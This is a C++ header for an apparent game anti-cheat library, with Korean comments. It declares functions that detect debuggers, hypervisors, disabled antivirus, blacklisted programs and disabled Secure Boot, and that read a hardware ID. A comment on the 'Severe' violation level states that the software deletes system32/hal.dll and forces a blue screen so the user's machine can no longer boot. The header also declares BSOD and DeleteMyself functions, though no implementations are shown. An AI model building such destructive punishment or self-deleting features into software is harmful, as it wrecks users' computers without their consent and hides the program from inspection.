#pragma once

#include "DLLExport.h"

#ifdef _DEBUG
#pragma comment(lib, "x64/Debug/ServerCore.lib")
#else
#pragma comment(lib, "x64/Release/ServerCore.lib")
#endif

#include "CorePch.h"

enum UserViolationLevel {
	Trivial, // 경고 - 클라이언트에 경고 pop up을 띄우고 프로그램을 종료함
	Moderate, // 밴 - 이 수준이면 바로 밴
	Severe // 우회행위가 감지된 유저 - system32/hal.dll 삭제 후 블루스크린. 다음 부팅 때 부팅 못함
};

enum RequestType {
	CheckBanStatus = 10101 // 서버에 밴 여부 확인 request 보냄
};

enum ReplyType {
	Yes = 0,
	No = 1
};

bool IsHypervisorPresent();

void BSOD(uint32 delay);

void DeleteMyself();

bool IsAntivirusDisabled();

bool IsDebugging();

bool IsBlacklistedProgramPresent();

std::string GetHardwareID();

bool IsSecureBootDisabled();

// to_string 오류 - https://yyman.tistory.com/466
namespace patch
{
	template < typename T > std::string to_string(const T& n)
	{
		std::ostringstream stm;
		stm << n;
		return stm.str();
	}
}